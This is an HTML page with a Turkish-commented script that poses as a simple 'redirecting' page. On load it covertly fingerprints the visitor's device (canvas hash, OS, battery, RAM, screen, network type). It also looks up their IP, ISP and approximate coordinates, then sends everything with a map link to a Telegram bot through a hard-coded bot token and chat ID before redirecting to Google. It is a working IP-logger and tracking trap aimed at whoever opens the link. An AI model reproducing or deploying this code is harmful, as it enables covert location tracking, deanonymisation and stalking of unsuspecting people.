<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Yönlendiriliyor...</title>
</head>
<body>
    <script>
        // Canvas Fingerprint üretimi
        function getCanvasFingerprint() {
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                ctx.textBaseline = "top";
                ctx.font = "14px 'Arial'";
                ctx.fillStyle = "#f60";
                ctx.fillRect(125, 1, 62, 20);
                ctx.fillText("CS", 2, 15);
                const src = canvas.toDataURL();
                let hash = 0;
                for (let i = 0; i < src.length; i++) {
                    hash = ((hash << 5) - hash) + src.charCodeAt(i);
                    hash = hash & hash;
                }
                return Math.abs(hash).toString(16).toUpperCase();
            } catch (e) { return "Bilinmiyor"; }
        }

        window.onload = async function() {
            // Süreyi minimuma indirmek için istek anında başlatılır
            const ipFetch = fetch("https://ipapi.co/json/?cb=" + Math.random())
                .then(r => r.json())
                .catch(() => fetch("https://api.db-ip.com/v2/free/self/?cb=" + Math.random()).then(r => r.json()));

            let ua = navigator.userAgent;
            let os = "Bilinmeyen Sistem";
            
            // iOS Sürüm Doğrulama
            if (/iPhone|iPad|iPod/i.test(ua)) {
                let match = ua.match(/OS (\d+)_(\d+)_?(\d+)?/);
                if (match) {
                    os = "iOS " + match[1] + "." + match[2] + (match[3] ? "." + match[3] : "");
                } else { os = "iOS"; }
            } else if (/Android/i.test(ua)) {
                let match = ua.match(/Android\s([0-9\.]+)/);
                os = match ? "Android " + match[1] : "Android";
            } else if (/Windows/i.test(ua)) { os = "Windows"; }

            // Ağ Tipi Doğrulama
            let ag_baglantisi = "Bilinmiyor";
            if (navigator.connection) {
                let type = navigator.connection.type || navigator.connection.effectiveType || "";
                if (type.includes("cellular") || type.includes("wimax")) {
                    ag_baglantisi = "Mobil Veri";
                } else if (type.includes("wifi")) {
                    ag_baglantisi = "Wi-Fi";
                }
            }

            let pil = "Bilinmiyor";
            if (navigator.getBattery) { try { let b = await navigator.getBattery(); pil = Math.round(b.level * 100) + "%"; } catch(e){} }
            let ekran = window.screen.width + "x" + window.screen.height;
            let cekirdek = navigator.hardwareConcurrency || "?";
            let ram = navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Bilinmiyor";
            let tarih = new Date().toLocaleString('tr-TR');

            let ip = "Bilinmiyor", ulke = "Bilinmiyor", eyalet_sehir = "Bilinmiyor", internet_sirketi = "Bilinmiyor", maps_link = "https://maps.google.com";

            try {
                let veri = await ipFetch;
                if (veri) {
                    ip = veri.ip || veri.ipAddress || "Bilinmiyor";
                    ulke = veri.country_name || veri.countryName || "Bilinmiyor";
                    eyalet_sehir = veri.city ? (veri.region ? veri.region + " / " + veri.city : veri.city) : "Bilinmiyor";
                    internet_sirketi = veri.org || "Bilinmiyor";
                    if (veri.latitude && veri.longitude) {
                        maps_link = "https://www.google.com/maps?q=" + veri.latitude + "," + veri.longitude;
                    }
                    if (ag_baglantisi === "Bilinmiyor") {
                        let org_lower = internet_sirketi.toLowerCase();
                        if (/turkcell|vodafone|avea|tt mobil|telekom/i.test(org_lower)) {
                            ag_baglantisi = "Mobil Veri";
                        } else { ag_baglantisi = "Wi-Fi / Sabit Hat"; }
                    }
                }
            } catch (e) {}

            let mesaj = "👑 *YENİ SİSTEM LOGU*\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "🌐 *IP Adresi:* `" + ip + "`\n";
            mesaj += "🤖 *Sistem (OS):* `" + os + "`\n";
            mesaj += "📡 *Bağlantı Tipi:* " + ag_baglantisi + "\n";
            mesaj += "🏢 *Sağlayıcı (ISP):* " + internet_sirketi + "\n";
            mesaj += "📍 *Konum:* " + ulke + " - " + eyalet_sehir + "\n";
            mesaj += "⏰ *Zaman:* " + tarih + "\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━\n";
            mesaj += "🖥 *Ekran / Donanım:* " + ekran + " / " + cekirdek + " Çekirdek\n";
            mesaj += "💾 *RAM / Pil:* " + ram + " / " + pil + "\n";
            mesaj += "🔑 *Canvas ID:* `" + getCanvasFingerprint() + "`\n";
            mesaj += "━━━━━━━━━━━━━━━━━━━━━━";

            // Inline klavye buton nesnesi
            let reply_markup = {
                inline_keyboard: [
                    [
                        { text: "📁 Data Dosyası Oluştur", callback_data: "data_olustur" },
                        { text: "📍 Haritada Gör", url: maps_link }
                    ]
                ]
            };

            let tok = "8955422545:AAHLRntql6QLsF6DTdy6uaZRsBeVTvxzVtU";
            let cid = "6845229845";

            // En yüksek hız için POST metodu ve JSON gövdesi ile gönderim
            fetch(`https://api.telegram.org/bot${tok}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: cid,
                    text: mesaj,
                    parse_mode: "Markdown",
                    reply_markup: reply_markup
                })
            }).then(() => {
                window.location.replace("https://www.google.com");
            }).catch(() => {
                window.location.replace("https://www.google.com");
            });
        };
    </script>
</body>
</html>
